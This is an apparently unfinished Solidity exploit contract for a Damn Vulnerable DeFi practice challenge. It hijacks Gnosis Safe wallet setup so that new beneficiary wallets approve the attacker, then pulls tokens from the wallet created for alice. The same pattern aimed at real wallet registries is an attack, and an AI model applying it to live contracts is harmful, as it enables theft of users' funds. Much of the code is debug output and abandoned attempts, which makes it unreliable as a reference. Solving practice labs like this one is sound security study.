pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "../Problems/damnvulnerabledefi/11/WalletRegistry.sol";
import "../Problems/damnvulnerabledefi/utils/DamnValuableToken.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "hardhat/console.sol";

contract AttackGenosisSafe {
    GnosisSafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;
    GnosisSafe masterCopy;

    constructor(GnosisSafeProxyFactory instance, GnosisSafe _masterCopy, WalletRegistry _walletRegistry){
        walletFactory = instance;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
    }

    //const byteArr1 = iface.encodeFunctionData("setup",
    //[
    //[david.address],
    //1,
    //player.address,
    //0x00,
    //ethers.utils.getAddress("0x0000000000000000000000000000000000000000"),
    //ethers.utils.getAddress("0x0000000000000000000000000000000000000000"),
    //0, player.address
    //])
    //const attackContract = await (await ethers.getContractFactory('AttackGenosisSafe', deployer)).deploy(walletFactory.address);
    //console.log("attackContract address : " + attackContract.address)
    //
    //const tnx4 = await walletFactory.connect(player).createProxyWithCallback(masterCopy.address, byteArr1, 0, walletRegistry.address);

    function attack(address alice, address bob, address charlie, address david, DamnValuableToken token) external {
        address[] memory addresses = new address[](1);
        console.log("HERE1111111111111111");
        console.log(uint256(keccak256("fallback_manager.handler.address")));
        addresses[0] = alice;
        bytes memory setupData1 = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
            addresses,
            1,
            address(token),
//            abi.encodeWithSignature("execTransactionFromModule(address,uint256,bytes,Enum.Operation)", address(token), 10 ether, abi.encodeWithSignature("approve(address,uint256)",msg.sender,10 ether), Enum.Operation.Call),
            abi.encodeWithSignature("approve(address,uint256)", address(this), 10 ether),
            0x0000000000000000000000000000000000000000,
            0x0000000000000000000000000000000000000000,
            0,
            msg.sender
        );

        address payable proxy1 = payable(address(walletFactory.createProxyWithCallback(address(masterCopy), setupData1, 0, walletRegistry)));
        //        GnosisSafe(proxy1).call().transfer(msg.sender, 10 ether);
        token.transferFrom(proxy1,msg.sender,10 ether);
        console.log("success");
//        console.log(success);
//        console.logBytes(data);
        console.log(token.balanceOf(msg.sender));
        //        bytes memory setupData9 = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
        //            addresses,
        //            1,
        //            msg.sender,
        //            0,
        //            0x0000000000000000000000000000000000000000,
        //            address(token),
        //            0,
        //            msg.sender
        //        );
        //        GnosisSafeProxy proxy1 = walletFactory.createProxyWithCallback(address(masterCopy), setupData1, 0, walletRegistry);
        //        GnosisSafeProxy proxy10 = walletFactory.createProxyWithCallback(address(masterCopy), setupData1, 1, walletRegistry);
        //        GnosisSafe(payable(address(proxy1))).setup(addresses,
        //            1,
        //            msg.sender,
        //            new bytes(0),
        //            0x0000000000000000000000000000000000000000,
        //            0x0000000000000000000000000000000000000000,
        //            0,
        //            payable(msg.sender));
        //    console.log("Balance");
        //        console.log(token.balanceOf(proxy1));
        //        GnosisSafe(proxy1).execTransaction(
        //        msg.sender,
        //        10 ether,
        //        "0",
        //        Enum.Operation.Call,
        //        gasleft(),
        //        0.001 ether,
        //        0.0000001 ether,
        //        address(token),
        //        payable(msg.sender),
        //        "0"
        //        );
        addresses[0] = bob;
        bytes memory setupData2 = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
            addresses,
            1,
            msg.sender,
            0,
            0x0000000000000000000000000000000000000000,
            0x0000000000000000000000000000000000000000,
            0,
            msg.sender
        );
        GnosisSafeProxy proxy2 = walletFactory.createProxyWithCallback(address(masterCopy), setupData2, 0, walletRegistry);

        addresses[0] = charlie;
        bytes memory setupData3 = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
            addresses,
            1,
            msg.sender,
            0,
            0x0000000000000000000000000000000000000000,
            0x0000000000000000000000000000000000000000,
            0,
            msg.sender
        );
        GnosisSafeProxy proxy3 = walletFactory.createProxyWithCallback(address(masterCopy), setupData3, 0, walletRegistry);

        addresses[0] = david;
        bytes memory setupData4 = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
            addresses,
            1,
            msg.sender,
            0,
            0x0000000000000000000000000000000000000000,
            0x0000000000000000000000000000000000000000,
            0,
            msg.sender
        );
        GnosisSafeProxy proxy4 = walletFactory.createProxyWithCallback(address(masterCopy), setupData4, 0, walletRegistry);

    }

    function assemblyTest1() public view returns (string memory returnedVal) {
        bytes32 val = "";

        assembly {
            val := "Hello"
        }

        returnedVal = string(abi.encodePacked(val));

    }

    fallback() external {
        assembly {
        //            success := delegatecall(gas(), to, add(data, 0x20), mload(data), 0, 0)
        }
    }
}
